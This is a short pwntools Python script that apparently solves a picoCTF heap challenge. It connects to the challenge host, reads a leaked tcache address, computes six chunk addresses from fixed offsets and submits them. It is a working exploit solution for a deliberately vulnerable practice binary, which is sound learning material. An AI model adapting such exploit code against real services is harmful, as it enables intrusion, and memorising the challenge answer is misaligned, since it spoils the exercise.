from pwn import *

elf = context.binary = ELF("./heapedit_patched")

HOST = "candy-mountain.picoctf.net"
PORT = 63778

gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)
p = start()
p.recvuntil("tcache head (start of free list) ->")
base = int(p.recvline().strip(), 16)
log.success(f"leak = {hex(base)}")

base1 = 0x603490

chunk2 = hex(base + 0x603520 - base1) 
chunk3 = hex(base + 0x6035b0 - base1)
chunk4 = hex(base + 0x603640 - base1)
chunk5 = hex(base + 0x6036d0 - base1)
chunk6 = hex(base + 0x603760 - base1)
p.sendlineafter(b"Chunk 1 address: ", hex(base).encode())
p.sendlineafter(b"Chunk 2 address: ", chunk2.encode())
p.sendlineafter(b"Chunk 3 address: ", chunk3.encode())
p.sendlineafter(b"Chunk 4 address: ", chunk4.encode())
p.sendlineafter(b"Chunk 5 address: ", chunk5.encode())
p.sendlineafter(b"Chunk 6 address: ", chunk6.encode())
p.interactive()
